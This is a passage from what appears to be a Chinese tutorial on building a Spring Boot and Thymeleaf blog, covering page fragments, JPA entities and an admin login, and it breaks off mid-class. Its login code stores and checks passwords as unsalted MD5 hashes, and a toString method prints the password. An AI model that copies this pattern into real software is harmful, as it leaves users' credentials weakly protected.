&#125;\n\n&#125;\n动态页面 定义Thymeleaf片段\n&lt;!DOCTYPE html&gt;\n&lt;html lang&#x3D;&quot;en&quot; xmlns:th&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot;&gt;\n\n    &lt;head th:fragment&#x3D;&quot;head(title)&quot;&gt;\n        &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;\n        &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width,initial-scale&#x3D;1.0&quot;&gt;\n        &lt;title th:replace&#x3D;&quot;$&#123;title&#125;&quot;&gt;详情&lt;&#x2F;title&gt;\n        &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;semantic-ui@2.4.2&#x2F;dist&#x2F;semantic.min.css&quot;&gt;\n        &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;..&#x2F;static&#x2F;css&#x2F;typo.css&quot; th:href &#x3D; &quot;@&#123;&#x2F;css&#x2F;typo.css&#125;&quot;&gt;\n        &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;..&#x2F;static&#x2F;css&#x2F;animate.css&quot; th:href &#x3D; &quot;@&#123;&#x2F;css&#x2F;animate.css&#125;&quot;&gt;\n        &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;..&#x2F;static&#x2F;lib&#x2F;prism&#x2F;prism.css&quot; th:href &#x3D; &quot;@&#123;&#x2F;lib&#x2F;prism&#x2F;prism.css&#125;&quot;&gt;\n        &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;..&#x2F;static&#x2F;lib&#x2F;tocbot&#x2F;tocbot.css&quot; th:href &#x3D; &quot;@&#123;&#x2F;lib&#x2F;tocbot&#x2F;tocbot.css&#125;&quot;&gt;\n        &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;..&#x2F;static&#x2F;css&#x2F;meCs.css&quot; th:href &#x3D; &quot;@&#123;&#x2F;css&#x2F;meCs.css&#125;&quot;&gt;\n    &lt;&#x2F;head&gt;\n\n    &lt;body&gt;\n\n        &lt;!--导航--&gt;\n        &lt;nav th:fragment&#x3D;&quot;menu(n)&quot; class&#x3D;&quot;ui inverted attached segment m-padded-tb-mini m-shadow-small&quot;&gt;\n            &lt;div class&#x3D;&quot;ui container&quot;&gt;\n                &lt;div class&#x3D;&quot;ui inverted secondary stackable menu&quot;&gt;\n                    &lt;h2 class&#x3D;&quot;ui teal header item&quot;&gt;Guest Island&lt;&#x2F;h2&gt;\n                    &lt;a href&#x3D;&quot;#&quot; class&#x3D;&quot;m-item item m-mobile-hide&quot; th:classappend&#x3D;&quot;$&#123;n&#x3D;&#x3D;1&#125; ? &#39;active&#39;&quot;&gt;&lt;i class&#x3D;&quot;home icon&quot;&gt;&lt;&#x2F;i&gt;首页&lt;&#x2F;a&gt;\n                    &lt;a href&#x3D;&quot;#&quot; class&#x3D;&quot;m-item item m-mobile-hide&quot; th:classappend&#x3D;&quot;$&#123;n&#x3D;&#x3D;2&#125; ? &#39;active&#39;&quot;&gt;&lt;i class&#x3D;&quot;idea icon&quot;&gt;&lt;&#x2F;i&gt;分类&lt;&#x2F;a&gt;\n                    &lt;a href&#x3D;&quot;#&quot; class&#x3D;&quot;m-item item m-mobile-hide&quot; th:classappend&#x3D;&quot;$&#123;n&#x3D;&#x3D;3&#125; ? &#39;active&#39;&quot;&gt;&lt;i class&#x3D;&quot;tags icon&quot;&gt;&lt;&#x2F;i&gt;标签&lt;&#x2F;a&gt;\n                    &lt;a href&#x3D;&quot;#&quot; class&#x3D;&quot;m-item item m-mobile-hide&quot; th:classappend&#x3D;&quot;$&#123;n&#x3D;&#x3D;4&#125; ? &#39;active&#39;&quot;&gt;&lt;i class&#x3D;&quot;clone icon&quot;&gt;&lt;&#x2F;i&gt;归档&lt;&#x2F;a&gt;\n                    &lt;a href&#x3D;&quot;#&quot; class&#x3D;&quot;m-item item m-mobile-hide&quot; th:classappend&#x3D;&quot;$&#123;n&#x3D;&#x3D;5&#125; ? &#39;active&#39;&quot;&gt;&lt;i class&#x3D;&quot;info icon&quot;&gt;&lt;&#x2F;i&gt;关于我&lt;&#x2F;a&gt;\n                    &lt;!--搜索栏--&gt;\n                    &lt;div class&#x3D;&quot;right m-item item m-mobile-hide&quot;&gt;\n                        &lt;div class&#x3D;&quot;ui icon inverted transparent input&quot;&gt;\n                            &lt;input type&#x3D;&quot;text&quot; placeholder&#x3D;&quot;Search......&quot;&gt;\n                            &lt;i class&#x3D;&quot;search link icon&quot;&gt;&lt;&#x2F;i&gt;\n                        &lt;&#x2F;div&gt;\n                    &lt;&#x2F;div&gt;\n                &lt;&#x2F;div&gt;\n            &lt;&#x2F;div&gt;\n            &lt;a href&#x3D;&quot;#&quot; class&#x3D;&quot;ui menu toggle black icon button m-right-top m-mobile-show&quot;&gt;\n                &lt;i class&#x3D;&quot;sidebar icon&quot;&gt;&lt;&#x2F;i&gt;\n            &lt;&#x2F;a&gt;\n        &lt;&#x2F;nav&gt;\n\n        &lt;!--底部--&gt;\n        &lt;footer th:fragment&#x3D;&quot;footer&quot; class&#x3D;&quot;ui inverted vertical segment m-padded-tb-massivs&quot;&gt;\n            &lt;div class&#x3D;&quot;ui center aligned container&quot;&gt;\n                &lt;div class&#x3D;&quot;ui inverted divided stackable grid&quot;&gt;\n                    &lt;div class&#x3D;&quot;three wide column&quot;&gt;\n                        &lt;div class&#x3D;&quot;ui inverted link list&quot;&gt;\n                            &lt;div class&#x3D;&quot;item&quot;&gt;\n                                &lt;img src&#x3D;&quot;..&#x2F;static&#x2F;images&#x2F;WX_Arvin.jpg&quot; th:src &#x3D; &quot;@&#123;&#x2F;images&#x2F;WX_Arvin.jpg&#125;&quot; class&#x3D;&quot;ui rounded image&quot; alt&#x3D;&quot;Guest Island&quot; style&#x3D;&quot;width: 100px&quot;&gt;\n                            &lt;&#x2F;div&gt;\n                        &lt;&#x2F;div&gt;\n                    &lt;&#x2F;div&gt;\n                    &lt;div class&#x3D;&quot;three wide column&quot;&gt;\n                        &lt;h4 class&#x3D;&quot;ui inverted header m-text-thin m-text-spaced&quot;&gt;最新博客&lt;&#x2F;h4&gt;\n                        &lt;div class&#x3D;&quot;ui inverted link list&quot;&gt;\n                            &lt;a href&#x3D;&quot;#&quot; class&#x3D;&quot;item&quot;&gt;用户故事 (User Story) &lt;&#x2F;a&gt;\n                            &lt;a href&#x3D;&quot;#&quot; class&#x3D;&quot;item&quot;&gt;关于脑机的那些事&lt;&#x2F;a&gt;\n                            &lt;a href&#x3D;&quot;#&quot; class&#x3D;&quot;item&quot;&gt;2021年计划&lt;&#x2F;a&gt;\n                        &lt;&#x2F;div&gt;\n                    &lt;&#x2F;div&gt;\n                    &lt;div class&#x3D;&quot;three wide column&quot;&gt;\n                        &lt;h4 class&#x3D;&quot;ui inverted header m-text-thin m-text-spaced&quot;&gt;关于我&lt;&#x2F;h4&gt;\n                        &lt;div class&#x3D;&quot;ui inverted link list&quot;&gt;\n                            &lt;a href&#x3D;&quot;#&quot; class&#x3D;&quot;item&quot;&gt;Email: 2644266656@qq.com&lt;&#x2F;a&gt;\n                            &lt;a href&#x3D;&quot;#&quot; class&#x3D;&quot;item&quot;&gt;QQ: 2644266656&lt;&#x2F;a&gt;\n                        &lt;&#x2F;div&gt;\n                    &lt;&#x2F;div&gt;\n                    &lt;div class&#x3D;&quot;seven wide column&quot;&gt;\n                        &lt;h4 class&#x3D;&quot;ui inverted header m-text-thin m-text-spaced&quot;&gt;Guest Island&lt;&#x2F;h4&gt;\n                        &lt;p class&#x3D;&quot;m-text-thin m-text-spaced m-opacity-mini&quot;&gt;南有孤岛北有亡梦，南柯一梦终是虚无。&lt;&#x2F;p&gt;\n                    &lt;&#x2F;div&gt;\n                &lt;&#x2F;div&gt;\n                &lt;div class&#x3D;&quot;ui inverted section divider&quot;&gt;&lt;&#x2F;div&gt;\n                &lt;p class&#x3D;&quot;m-text-thin m-text-spaced m-opacity-tiny&quot;&gt;Copyright &amp;copy; 2020-2021 Guest Island Personal blog&lt;&#x2F;p&gt;\n            &lt;&#x2F;div&gt;\n        &lt;&#x2F;footer&gt;\n\n        &lt;!--script--&gt;\n        &lt;th:block th:fragment&#x3D;&quot;script&quot;&gt;\n            &lt;script src&#x3D;&quot;https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;jquery@3.2&#x2F;dist&#x2F;jquery.min.js&quot;&gt;&lt;&#x2F;script&gt;\n            &lt;script src&#x3D;&quot;https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;semantic-ui@2.4.2&#x2F;dist&#x2F;semantic.min.js&quot;&gt;&lt;&#x2F;script&gt;\n            &lt;script src&#x3D;&quot;&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;jquery.scrollto@2.1.2&#x2F;jquery.scrollTo.min.js&quot;&gt;&lt;&#x2F;script&gt;\n            &lt;script src&#x3D;&quot;..&#x2F;static&#x2F;lib&#x2F;prism&#x2F;prism.js&quot; th:src&#x3D;&quot;@&#123;&#x2F;lib&#x2F;prism&#x2F;prism.js&#125;&quot;&gt;&lt;&#x2F;script&gt;\n            &lt;script src&#x3D;&quot;..&#x2F;static&#x2F;lib&#x2F;tocbot&#x2F;tocbot.min.js&quot; th:src&#x3D;&quot;@&#123;&#x2F;lib&#x2F;tocbot&#x2F;tocbot.min.js&#125;&quot;&gt;&lt;&#x2F;script&gt;\n            &lt;script src&#x3D;&quot;..&#x2F;static&#x2F;lib&#x2F;qrcode&#x2F;qrcode.min.js&quot; th:src&#x3D;&quot;@&#123;&#x2F;lib&#x2F;qrcode&#x2F;qrcode.min.js&#125;&quot;&gt;&lt;&#x2F;script&gt;\n            &lt;script src&#x3D;&quot;..&#x2F;static&#x2F;lib&#x2F;waypoints&#x2F;jquery.waypoints.min.js&quot; th:src&#x3D;&quot;@&#123;&#x2F;lib&#x2F;waypoints&#x2F;jquery.waypoints.min.js&#125;&quot;&gt;&lt;&#x2F;script&gt;\n        &lt;&#x2F;th:block&gt;\n\n    &lt;&#x2F;body&gt;\n\n&lt;&#x2F;html&gt;\n\n实体设计blog.java 博客实体类\npackage com.cxkj.blog.pojo;\n\nimport javax.persistence.*;\nimport java.util.ArrayList;\nimport java.util.Date;\nimport java.util.List;\n\n&#x2F;**\n *  Created by Arvin on 2021&#x2F;2&#x2F;4.\n *&#x2F;\n@Entity\n@Table(name &#x3D; &quot;t_blog&quot;)\npublic class Blog &#123;\n\n    @Id\n    @GeneratedValue\n    private Long id;\n\n    private String title;\n    private String content;\n    private String firstPicture;\n    private String flag;\n    private Integer views;\n    private boolean appreciation;\n    private boolean shareStatement;\n    private boolean commentabled;\n    private boolean published;\n    private boolean recommend;\n    @Temporal(TemporalType.TIMESTAMP)\n    private Date createTime;\n    @Temporal(TemporalType.TIMESTAMP)\n    private Date updateTime;\n\n    @ManyToOne\n    private Type type;\n\n    @ManyToMany(cascade &#x3D; &#123;CascadeType.PERSIST&#125;)\n    private List&lt;Tag&gt; tags &#x3D; new ArrayList&lt;&gt;();\n\n    @ManyToOne\n    private User user;\n\n    @OneToMany(mappedBy &#x3D; &quot;blog&quot;)\n    private List&lt;Comment&gt; comments &#x3D; new ArrayList&lt;&gt;();\n\n    public Blog() &#123;\n    &#125;\n\n    public Long getId() &#123;\n        return id;\n    &#125;\n\n    public void setId(Long id) &#123;\n        this.id &#x3D; id;\n    &#125;\n\n    public String getTitle() &#123;\n        return title;\n    &#125;\n\n    public void setTitle(String title) &#123;\n        this.title &#x3D; title;\n    &#125;\n\n    public String getContent() &#123;\n        return content;\n    &#125;\n\n    public void setContent(String content) &#123;\n        this.content &#x3D; content;\n    &#125;\n\n    public String getFirstPicture() &#123;\n        return firstPicture;\n    &#125;\n\n    public void setFirstPicture(String firstPicture) &#123;\n        this.firstPicture &#x3D; firstPicture;\n    &#125;\n\n    public String getFlag() &#123;\n        return flag;\n    &#125;\n\n    public void setFlag(String flag) &#123;\n        this.flag &#x3D; flag;\n    &#125;\n\n    public Integer getViews() &#123;\n        return views;\n    &#125;\n\n    public void setViews(Integer views) &#123;\n        this.views &#x3D; views;\n    &#125;\n\n    public boolean isAppreciation() &#123;\n        return appreciation;\n    &#125;\n\n    public void setAppreciation(boolean appreciation) &#123;\n        this.appreciation &#x3D; appreciation;\n    &#125;\n\n    public boolean isShareStatement() &#123;\n        return shareStatement;\n    &#125;\n\n    public void setShareStatement(boolean shareStatement) &#123;\n        this.shareStatement &#x3D; shareStatement;\n    &#125;\n\n    public boolean isCommentabled() &#123;\n        return commentabled;\n    &#125;\n\n    public void setCommentabled(boolean commentabled) &#123;\n        this.commentabled &#x3D; commentabled;\n    &#125;\n\n    public boolean isPublished() &#123;\n        return published;\n    &#125;\n\n    public void setPublished(boolean published) &#123;\n        this.published &#x3D; published;\n    &#125;\n\n    public boolean isRecommend() &#123;\n        return recommend;\n    &#125;\n\n    public void setRecommend(boolean recommend) &#123;\n        this.recommend &#x3D; recommend;\n    &#125;\n\n    public Date getCreateTime() &#123;\n        return createTime;\n    &#125;\n\n    public void setCreateTime(Date createTime) &#123;\n        this.createTime &#x3D; createTime;\n    &#125;\n\n    public Date getUpdateTime() &#123;\n        return updateTime;\n    &#125;\n\n    public void setUpdateTime(Date updateTime) &#123;\n        this.updateTime &#x3D; updateTime;\n    &#125;\n\n    public Type getType() &#123;\n        return type;\n    &#125;\n\n    public void setType(Type type) &#123;\n        this.type &#x3D; type;\n    &#125;\n\n    public List&lt;Tag&gt; getTags() &#123;\n        return tags;\n    &#125;\n\n    public void setTags(List&lt;Tag&gt; tags) &#123;\n        this.tags &#x3D; tags;\n    &#125;\n\n    public User getUser() &#123;\n        return user;\n    &#125;\n\n    public void setUser(User user) &#123;\n        this.user &#x3D; user;\n    &#125;\n\n    public List&lt;Comment&gt; getComments() &#123;\n        return comments;\n    &#125;\n\n    public void setComments(List&lt;Comment&gt; comments) &#123;\n        this.comments &#x3D; comments;\n    &#125;\n\n    @Override\n    public String toString() &#123;\n        return &quot;Blog&#123;&quot; +\n                &quot;id&#x3D;&quot; + id +\n                &quot;, title&#x3D;&#39;&quot; + title + &#39;\\&#39;&#39; +\n                &quot;, content&#x3D;&#39;&quot; + content + &#39;\\&#39;&#39; +\n                &quot;, firstPicture&#x3D;&#39;&quot; + firstPicture + &#39;\\&#39;&#39; +\n                &quot;, flag&#x3D;&#39;&quot; + flag + &#39;\\&#39;&#39; +\n                &quot;, views&#x3D;&quot; + views +\n                &quot;, appreciation&#x3D;&quot; + appreciation +\n                &quot;, shareStatement&#x3D;&quot; + shareStatement +\n                &quot;, commentabled&#x3D;&quot; + commentabled +\n                &quot;, published&#x3D;&quot; + published +\n                &quot;, recommend&#x3D;&quot; + recommend +\n                &quot;, createTime&#x3D;&quot; + createTime +\n                &quot;, updateTime&#x3D;&quot; + updateTime +\n                &#39;&#125;&#39;;\n    &#125;\n&#125;\nType.java 分类实体类\npackage com.cxkj.blog.pojo;\n\nimport javax.persistence.*;\nimport javax.validation.constraints.NotBlank;\nimport java.util.ArrayList;\nimport java.util.List;\n\n&#x2F;**\n *  Created by Arvin on 2021&#x2F;2&#x2F;4.\n *&#x2F;\n@Entity\n@Table(name &#x3D; &quot;t_type&quot;)\npublic class Type &#123;\n\n    @Id\n    @GeneratedValue\n    private Long id;\n    @NotBlank(message &#x3D; &quot;分类名称不能为空哦&quot;)\n    private String name;\n\n    @OneToMany(mappedBy &#x3D; &quot;type&quot;)\n    private List&lt;Blog&gt; blogs &#x3D; new ArrayList&lt;&gt;();\n\n    public Type() &#123;\n    &#125;\n\n    public Long getId() &#123;\n        return id;\n    &#125;\n\n    public void setId(Long id) &#123;\n        this.id &#x3D; id;\n    &#125;\n\n    public String getName() &#123;\n        return name;\n    &#125;\n\n    public void setName(String name) &#123;\n        this.name &#x3D; name;\n    &#125;\n\n    public List&lt;Blog&gt; getBlogs() &#123;\n        return blogs;\n    &#125;\n\n    public void setBlogs(List&lt;Blog&gt; blogs) &#123;\n        this.blogs &#x3D; blogs;\n    &#125;\n\n    @Override\n    public String toString() &#123;\n        return &quot;Type&#123;&quot; +\n                &quot;id&#x3D;&quot; + id +\n                &quot;, name&#x3D;&#39;&quot; + name + &#39;\\&#39;&#39; +\n                &#39;&#125;&#39;;\n    &#125;\n&#125;\nTag.java 标签实体类\npackage com.cxkj.blog.pojo;\n\nimport javax.persistence.*;\nimport java.util.ArrayList;\nimport java.util.List;\n\n&#x2F;**\n *  Created by Arvin on 2021&#x2F;2&#x2F;4.\n *&#x2F;\n@Entity\n@Table(name &#x3D; &quot;t_tag&quot;)\npublic class Tag &#123;\n\n    @Id\n    @GeneratedValue\n    private Long id;\n    private String name;\n\n    @ManyToMany(mappedBy &#x3D; &quot;tags&quot;)\n    private List&lt;Blog&gt; blogs &#x3D; new ArrayList&lt;&gt;();\n\n    public Tag() &#123;\n    &#125;\n\n    public Long getId() &#123;\n        return id;\n    &#125;\n\n    public void setId(Long id) &#123;\n        this.id &#x3D; id;\n    &#125;\n\n    public String getName() &#123;\n        return name;\n    &#125;\n\n    public void setName(String name) &#123;\n        this.name &#x3D; name;\n    &#125;\n\n    public List&lt;Blog&gt; getBlogs() &#123;\n        return blogs;\n    &#125;\n\n    public void setBlogs(List&lt;Blog&gt; blogs) &#123;\n        this.blogs &#x3D; blogs;\n    &#125;\n\n    @Override\n    public String toString() &#123;\n        return &quot;Tag&#123;&quot; +\n                &quot;id&#x3D;&quot; + id +\n                &quot;, name&#x3D;&#39;&quot; + name + &#39;\\&#39;&#39; +\n                &#39;&#125;&#39;;\n    &#125;\n&#125;\nComment.java 评论实体类\npackage com.cxkj.blog.pojo;\n\nimport javax.persistence.*;\nimport java.util.ArrayList;\nimport java.util.Date;\nimport java.util.List;\n\n&#x2F;**\n *  Created by Arvin on 2021&#x2F;2&#x2F;4.\n *&#x2F;\n@Entity\n@Table(name &#x3D; &quot;t_comment&quot;)\npublic class Comment &#123;\n\n    @Id\n    @GeneratedValue\n    private Long id;\n    private String nickname;\n    private String email;\n    private String content;\n    private String avatar;\n    @Temporal(TemporalType.TIMESTAMP)\n    private Date createTime;\n\n    @ManyToOne\n    private Blog blog;\n\n    @OneToMany(mappedBy &#x3D; &quot;parentComment&quot;)\n    private List&lt;Comment&gt; replyComments &#x3D; new ArrayList&lt;&gt;();\n    @ManyToOne\n    private Comment parentComment;\n\n    public Comment() &#123;\n    &#125;\n\n    public Long getId() &#123;\n        return id;\n    &#125;\n\n    public void setId(Long id) &#123;\n        this.id &#x3D; id;\n    &#125;\n\n    public String getNickname() &#123;\n        return nickname;\n    &#125;\n\n    public void setNickname(String nickname) &#123;\n        this.nickname &#x3D; nickname;\n    &#125;\n\n    public String getEmail() &#123;\n        return email;\n    &#125;\n\n    public void setEmail(String email) &#123;\n        this.email &#x3D; email;\n    &#125;\n\n    public String getContent() &#123;\n        return content;\n    &#125;\n\n    public void setContent(String content) &#123;\n        this.content &#x3D; content;\n    &#125;\n\n    public String getAvatar() &#123;\n        return avatar;\n    &#125;\n\n    public void setAvatar(String avatar) &#123;\n        this.avatar &#x3D; avatar;\n    &#125;\n\n    public Date getCreateTime() &#123;\n        return createTime;\n    &#125;\n\n    public void setCreateTime(Date createTime) &#123;\n        this.createTime &#x3D; createTime;\n    &#125;\n\n    public Blog getBlog() &#123;\n        return blog;\n    &#125;\n\n    public void setBlog(Blog blog) &#123;\n        this.blog &#x3D; blog;\n    &#125;\n\n    public List&lt;Comment&gt; getReplyComments() &#123;\n        return replyComments;\n    &#125;\n\n    public void setReplyComments(List&lt;Comment&gt; replyComments) &#123;\n        this.replyComments &#x3D; replyComments;\n    &#125;\n\n    public Comment getParentComment() &#123;\n        return parentComment;\n    &#125;\n\n    public void setParentComment(Comment parentComment) &#123;\n        this.parentComment &#x3D; parentComment;\n    &#125;\n\n    @Override\n    public String toString() &#123;\n        return &quot;Comment&#123;&quot; +\n                &quot;id&#x3D;&quot; + id +\n                &quot;, nickname&#x3D;&#39;&quot; + nickname + &#39;\\&#39;&#39; +\n                &quot;, email&#x3D;&#39;&quot; + email + &#39;\\&#39;&#39; +\n                &quot;, content&#x3D;&#39;&quot; + content + &#39;\\&#39;&#39; +\n                &quot;, avatar&#x3D;&#39;&quot; + avatar + &#39;\\&#39;&#39; +\n                &quot;, createTime&#x3D;&quot; + createTime +\n                &#39;&#125;&#39;;\n    &#125;\n&#125;\nUser.java 用户实体类\npackage com.cxkj.blog.pojo;\n\nimport javax.persistence.*;\nimport java.util.ArrayList;\nimport java.util.Date;\nimport java.util.List;\n\n&#x2F;**\n *  Created by Arvin on 2021&#x2F;2&#x2F;4.\n *&#x2F;\n@Entity\n@Table(name &#x3D; &quot;t_user&quot;)\npublic class User &#123;\n\n    @Id\n    @GeneratedValue\n    private Long id;\n    private String nickname;\n    private String username;\n    private String password;\n    private String email;\n    private String avatar;\n    private Integer type;\n    @Temporal(TemporalType.TIMESTAMP)\n    private Date CreateTime;\n    @Temporal(TemporalType.TIMESTAMP)\n    private Date updateTime;\n\n    @OneToMany(mappedBy &#x3D; &quot;user&quot;)\n    private List&lt;Blog&gt; blogs &#x3D; new ArrayList&lt;&gt;();\n\n    public User() &#123;\n    &#125;\n\n    public Long getId() &#123;\n        return id;\n    &#125;\n\n    public void setId(Long id) &#123;\n        this.id &#x3D; id;\n    &#125;\n\n    public String getNickname() &#123;\n        return nickname;\n    &#125;\n\n    public void setNickname(String nickname) &#123;\n        this.nickname &#x3D; nickname;\n    &#125;\n\n    public String getUsername() &#123;\n        return username;\n    &#125;\n\n    public void setUsername(String username) &#123;\n        this.username &#x3D; username;\n    &#125;\n\n    public String getPassword() &#123;\n        return password;\n    &#125;\n\n    public void setPassword(String password) &#123;\n        this.password &#x3D; password;\n    &#125;\n\n    public String getEmail() &#123;\n        return email;\n    &#125;\n\n    public void setEmail(String email) &#123;\n        this.email &#x3D; email;\n    &#125;\n\n    public String getAvatar() &#123;\n        return avatar;\n    &#125;\n\n    public void setAvatar(String avatar) &#123;\n        this.avatar &#x3D; avatar;\n    &#125;\n\n    public Integer getType() &#123;\n        return type;\n    &#125;\n\n    public void setType(Integer type) &#123;\n        this.type &#x3D; type;\n    &#125;\n\n    public Date getCreateTime() &#123;\n        return CreateTime;\n    &#125;\n\n    public void setCreateTime(Date createTime) &#123;\n        CreateTime &#x3D; createTime;\n    &#125;\n\n    public Date getUpdateTime() &#123;\n        return updateTime;\n    &#125;\n\n    public void setUpdateTime(Date updateTime) &#123;\n        this.updateTime &#x3D; updateTime;\n    &#125;\n\n    public List&lt;Blog&gt; getBlogs() &#123;\n        return blogs;\n    &#125;\n\n    public void setBlogs(List&lt;Blog&gt; blogs) &#123;\n        this.blogs &#x3D; blogs;\n    &#125;\n\n    @Override\n    public String toString() &#123;\n        return &quot;User&#123;&quot; +\n                &quot;id&#x3D;&quot; + id +\n                &quot;, nickname&#x3D;&#39;&quot; + nickname + &#39;\\&#39;&#39; +\n                &quot;, username&#x3D;&#39;&quot; + username + &#39;\\&#39;&#39; +\n                &quot;, password&#x3D;&#39;&quot; + password + &#39;\\&#39;&#39; +\n                &quot;, email&#x3D;&#39;&quot; + email + &#39;\\&#39;&#39; +\n                &quot;, avatar&#x3D;&#39;&quot; + avatar + &#39;\\&#39;&#39; +\n                &quot;, type&#x3D;&quot; + type +\n                &quot;, CreateTime&#x3D;&quot; + CreateTime +\n                &quot;, updateTime&#x3D;&quot; + updateTime +\n                &#39;&#125;&#39;;\n    &#125;\n&#125;\n后台登录业务UserService.java User登录业务逻辑处理接口类\npackage com.cxkj.blog.service;\n\nimport com.cxkj.blog.pojo.User;\n\n&#x2F;**\n *  Created by Arvin on 2021&#x2F;2&#x2F;5.\n *&#x2F;\n\npublic interface UserService &#123;\n    \n    User checkUser(String username,String password);\n&#125;\nUserServiceImpl.java User登录业务逻辑处理实现类\npackage com.cxkj.blog.service;\n\nimport com.cxkj.blog.dao.UserRepository;\nimport com.cxkj.blog.pojo.User;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.stereotype.Service;\n\n&#x2F;**\n *  Created by Arvin on 2021&#x2F;2&#x2F;5.\n *&#x2F;\n@Service\npublic class UserServiceImpl implements UserService&#123;\n    \n    @Autowired\n    private UserRepository userRepository;\n    \n    @Override\n    public User checkUser(String username, String password) &#123;\n        User user &#x3D; userRepository.findByUsernameAndPassword(username,password);\n        return user;\n    &#125;\n    \n&#125;\nUserRepository.java 引用SpringJPA SQL操作接口\npackage com.cxkj.blog.dao;\n\nimport com.cxkj.blog.pojo.User;\nimport org.springframework.data.jpa.repository.JpaRepository;\n\n&#x2F;**\n *  Created by Arvin on 2021&#x2F;2&#x2F;5.\n *&#x2F;\n\npublic interface UserRepository extends JpaRepository&lt;User,Long&gt; &#123;\n    \n    User findByUsernameAndPassword(String username,String password);\n&#125;\nLoginController.java WEB登录模块控制器\npackage com.cxkj.blog.web.admin;\n\nimport com.cxkj.blog.pojo.User;\nimport com.cxkj.blog.service.UserService;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.stereotype.Controller;\nimport org.springframework.ui.Model;\nimport org.springframework.web.bind.annotation.GetMapping;\nimport org.springframework.web.bind.annotation.PostMapping;\nimport org.springframework.web.bind.annotation.RequestMapping;\nimport org.springframework.web.bind.annotation.RequestParam;\nimport org.springframework.web.servlet.mvc.support.RedirectAttributes;\n\nimport javax.servlet.http.HttpSession;\n\n&#x2F;**\n *  Created by Arvin on 2021&#x2F;2&#x2F;5.\n *&#x2F;\n@Controller\n@RequestMapping(&quot;&#x2F;admin&quot;)\npublic class LoginController &#123;\n    \n    @Autowired\n    private UserService userService;\n    \n    @GetMapping\n    public String loginPage()&#123;\n        return &quot;admin&#x2F;login&quot;;\n    &#125;\n    \n    @PostMapping(&quot;&#x2F;login&quot;)\n    public String login(@RequestParam String username, @RequestParam String password, HttpSession session, RedirectAttributes attributes)&#123;\n        User user &#x3D; userService.checkUser(username,password);\n        if (user !&#x3D; null)&#123;\n            user.setPassword(null);\n            session.setAttribute(&quot;user&quot;,user);\n            return &quot;admin&#x2F;index&quot;;\n        &#125;else &#123;\n            attributes.addFlashAttribute(&quot;message&quot;,&quot;用户名和密码存在异常错误&quot;);\n            return &quot;redirect:&#x2F;admin&quot;;\n        &#125;\n        \n    &#125;\n    \n    @GetMapping(&quot;&#x2F;logout&quot;)\n    public String logout(HttpSession session)&#123;\n        session.removeAttribute(&quot;user&quot;);\n        return &quot;redirect:&#x2F;admin&quot;;\n    &#125;\n&#125;\nMD5加密MD5Utils.java MD5加密工具类\npackage com.cxkj.blog.util;\n\nimport java.security.MessageDigest;\nimport java.security.NoSuchAlgorithmException;\n\n&#x2F;**\n *  Created by Arvin on 2021&#x2F;2&#x2F;5.\n *\n *  MD5加密类\n * @parm str 要加密的字符串\n * @return 加密后的字符串\n *&#x2F;\n\npublic class MD5Utils &#123;\n\n    public static String code(String str)&#123;\n\n        try &#123;\n            MessageDigest md &#x3D; MessageDigest.getInstance(&quot;MD5&quot;);\n            md.update(str.getBytes());\n            byte[] bytesDigest &#x3D; md.digest();\n            int i;\n            StringBuffer buffer &#x3D; new StringBuffer(&quot;&quot;);\n            for (int offset &#x3D; 0;offset&lt;bytesDigest.length;offset++)&#123;\n                i &#x3D; bytesDigest[offset];\n                if (i&lt;0)\n                    i+&#x3D; 256;\n                if (i&lt;16)\n                    buffer.append(&quot;0&quot;);\n                buffer.append(Integer.toHexString(i));\n            &#125;\n            &#x2F;&#x2F;32位加密\n            return buffer.toString();\n            &#x2F;&#x2F;16位加密\n            &#x2F;&#x2F;return buffer.toString().substring(8,20);\n        &#125; catch (NoSuchAlgorithmException e) &#123;\n            e.printStackTrace();\n            return null;\n        &#125;\n\n    &#125;\n    \n    &#x2F;&#x2F;加密测试Main方法\n    public static void main(String[] args) &#123;\n        System.out.println(code(&quot;123456789&quot;));\n    &#125;\n&#125;\nUserServiceImpl.java\npackage com.cxkj.blog.service;\n\nimport com.cxkj.blog.dao.UserRepository;\nimport com.cxkj.blog.pojo.User;\nimport com.cxkj.blog.util.MD5Utils;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.stereotype.Service;\n\n&#x2F;**\n *  Created by Arvin on 2021&#x2F;2&#x2F;5.\n *&#x2F;\n@Service\npublic class UserServiceImpl implements UserService&#123;\n\n    @Autowired\n    private UserRepository userRepository;\n\n    @Override\n    public User checkUser(String username, String password) &#123;\n        User user &#x3D; userRepository.findByUsernameAndPassword(username, MD5Utils.code(password));\n        return user;\n    &#125;\n\n&#125;\nBlogController.java 博客后台页面权限过滤管理类\npackage com.cxkj.blog.web.admin;\n\nimport org.springframework.stereotype.Controller;\nimport org.springframework.web.bind.annotation.GetMapping;\nimport org.springframework.web.bind.annotation.RequestMapping;\n\n&#x2F;**\n *  Created by Arvin on 2021&#x2F;2&#x2F;5.\n *&#x2F;\n@Controller\n@RequestMapping(&quot;&#x2F;admin&quot;)\npublic class BlogController &#123;\n\n    @GetMapping(&quot;&#x2F;blogs&quot;)\n    public String blogs() &#123;\n        return &quot;blogs&quot;;\n    &#125;\n\n&#125;\nLongInterceptor.java Blog后台页面权限(登录过滤)类\npackage com.cxkj.blog.interceptor;\n\nimport org.springframework.web.servlet.handler.HandlerInterceptorAdapter;\n\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\n&#x2F;**\n *  Created by Arvin on 2021&#x2F;2&#x2F;5.\n *&#x2F;\n\npublic class LongInterceptor extends WebMvcConfigurerAdapter 